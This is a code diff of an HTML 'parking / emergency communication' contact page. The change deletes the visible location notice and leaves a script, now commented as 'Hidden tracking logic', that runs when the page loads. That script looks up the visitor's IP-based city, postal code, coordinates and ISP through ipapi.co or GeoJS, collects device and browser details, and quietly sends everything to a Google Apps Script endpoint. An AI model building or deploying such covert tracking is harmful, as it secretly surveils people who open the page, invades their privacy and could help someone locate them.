@@ -62,11 +62,6 @@
       color: #9ca3af;
       margin-top: 14px;
     }
-    .note-geo {
-      font-size: 11px;
-      color: #6b7280;
-      margin-top: 4px;
-    }
   </style>
 </head>
 <body>
@@ -88,19 +83,14 @@
     <div class="note">
       For parking / emergency communication only.
     </div>
-    <div id="geo-note" class="note-geo">
-      Detecting approximate location…
-    </div>
   </div>
 
-  <!-- Logging + IP geolocation (ipapi.co + GeoJS fallback) -->
+  <!-- Hidden tracking logic (no visible text) -->
   <script>
   (function() {
 
-    // 🔴 IMPORTANT: paste your Apps Script Web App URL here:
+    // Your Apps Script Web App URL
     var LOG_URL = "https://script.google.com/macros/s/AKfycbxyxz9IpQjGG81Skr_qcUSSeWfAVIEx7iJLAGdwDuTvoiQkgRA4CYRDq7f2bWghX7K4Xg/exec";
-
-    var geoNoteEl = document.getElementById("geo-note");
 
     function getDeviceType() {
       if (/mobile/i.test(navigator.userAgent)) return "Mobile";
@@ -128,14 +118,10 @@
 
     function extractModel() {
       var ua = navigator.userAgent;
-
-      // Android example: "; SM-M325F Build/"
       var match = ua.match(/;\s?([A-Z0-9\-]+)\s?Build/i);
       if (match) return match[1];
-
       if (/iPhone/i.test(ua)) return "iPhone";
       if (/iPad/i.test(ua)) return "iPad";
-
       return "Unknown";
     }
 
@@ -156,7 +142,6 @@
         language:   navigator.language || "",
         timezone:   (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
 
-        // IP/location fields coming from API
         ip:          extra.ip          || "",
         city:        extra.city        || "",
         region:      extra.region      || "",
@@ -176,69 +161,38 @@
         })
         .join("&");
 
-      try {
-        var img = new Image();
-        img.src = LOG_URL + "?" + qs;
-      } catch (e) {
-        // ignore
-      }
-    }
-
-  //  function updateGeoNote(extra, from) {
-  //    if (!geoNoteEl) return;
- //     if (!extra) {
-  //      geoNoteEl.textContent = "Location info not available.";
-  //      return;
-  //    }
-  //    var locParts = [];
-  //    if (extra.city)   locParts.push(extra.city);
-  //    if (extra.region) locParts.push(extra.region);
-  //    if (extra.country) locParts.push(extra.country);
-  //    if (extra.postal) locParts.push("PIN " + extra.postal);
-
-      if (locParts.length) {
-        geoNoteEl.textContent =
-          "Approximate location (" + from + "): " + locParts.join(", ");
-      } else {
-        geoNoteEl.textContent = "Approximate location detected (" + from + ").";
-      }
+      var img = new Image();
+      img.src = LOG_URL + "?" + qs;
     }
 
     function fallbackGeoJS() {
-      // 🌍 GeoJS fallback (no postal/pincode)
       fetch("https://get.geojs.io/v1/ip/geo.json")
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
+        .then(res => res.json())
+        .then(data => {
           var extra = {
             ip:          data.ip || "",
             city:        data.city || "",
             region:      data.region || "",
             country:     data.country || "",
             countryCode: data.country_code || "",
-            postal:      "", // GeoJS does not provide postal
+            postal:      "",
             latitude:    data.latitude || "",
             longitude:   data.longitude || "",
             isp:         data.organization || "",
             org:         data.organization || "",
-            asn:         "" // not provided directly
+            asn:         ""
           };
-
-          updateGeoNote(extra, "GeoJS");
           sendLog(extra);
         })
-        .catch(function(err) {
-          updateGeoNote(null);
-          sendLog({});
-        });
+        .catch(() => sendLog({}));
     }
 
     function fetchIpAndLog() {
-      // First try ipapi.co (gives postal/pincode if available)
       fetch("https://ipapi.co/json/")
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
+        .then(res => res.json())
+        .then(data => {
           if (data && !data.error) {
-            var extra = {
+            sendLog({
               ip:          data.ip || "",
               city:        data.city || "",
               region:      data.region || "",
@@ -250,28 +204,15 @@
               isp:         data.org || "",
               org:         data.org || "",
               asn:         data.asn || ""
-            };
-
-            updateGeoNote(extra, "ipapi");
-            sendLog(extra);
+            });
           } else {
-            // If ipapi returns error field, use GeoJS fallback
             fallbackGeoJS();
           }
         })
-        .catch(function(err) {
-          // If ipapi fails (blocked / rate limited), fallback to GeoJS
-          fallbackGeoJS();
-        });
+        .catch(() => fallbackGeoJS());
     }
 
-    // Start IP-based logging on page load
-    try {
-      fetchIpAndLog();
-    } catch (e) {
-      updateGeoNote(null);
-      sendLog({});
-    }
+    fetchIpAndLog();
 
   })();
   </script>
